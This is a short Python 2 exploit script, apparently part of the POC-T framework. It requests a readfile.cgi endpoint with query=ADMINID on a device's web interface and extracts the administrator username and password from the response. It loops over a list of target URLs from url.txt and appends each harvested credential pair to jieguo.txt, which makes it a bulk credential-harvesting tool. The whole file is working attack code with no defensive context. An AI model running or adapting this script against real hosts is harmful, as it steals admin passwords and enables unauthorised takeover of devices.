#!/usr/bin/env python
# -*- coding: utf-8 -*-
# project = https://github.com/Xyntax/POC-T
# author = i@cdxy.me
import requests,re
r1=re.compile(r'\"(.*?)\"')
def poc(url):
    if '://' not in url:
        url = 'http://' + url
    payload = "/cgi-bin/readfile.cgi?query=ADMINID"
    target_url = url + payload
    try:
        r = requests.get(target_url, timeout=10)

        if 'var Adm_Pass1' in r.content:
            b=r.text
            a=b.split(';\n')
            c=a[0]
            d=a[1]
            f=c+d
            e=re.findall(r1,f)
            jieguo=url+" "+e[0]+"|"+e[1]
            print jieguo
            lvu.append(jieguo)
    except Exception:
        pass
    return False


if __name__=='__main__':
    
    lvu=[]
    fp=open("url.txt", "r")
    alllines=fp.readlines()
    fp.close()
    for eachline in alllines:
            eachline=eachline.strip('\n')
            eachline=eachline.strip(' ')
            poc(eachline)

print lvu
fp1=open("jieguo.txt", "a")
for i in range(len(lvu)):
    print lvu[i]
    lvu1=lvu[i]
    lvu1=lvu1.strip('\n')
    lvu1=lvu1.strip('')
    lvu2=lvu1+'\n'
    fp1.write(lvu2)
fp1.close()    
    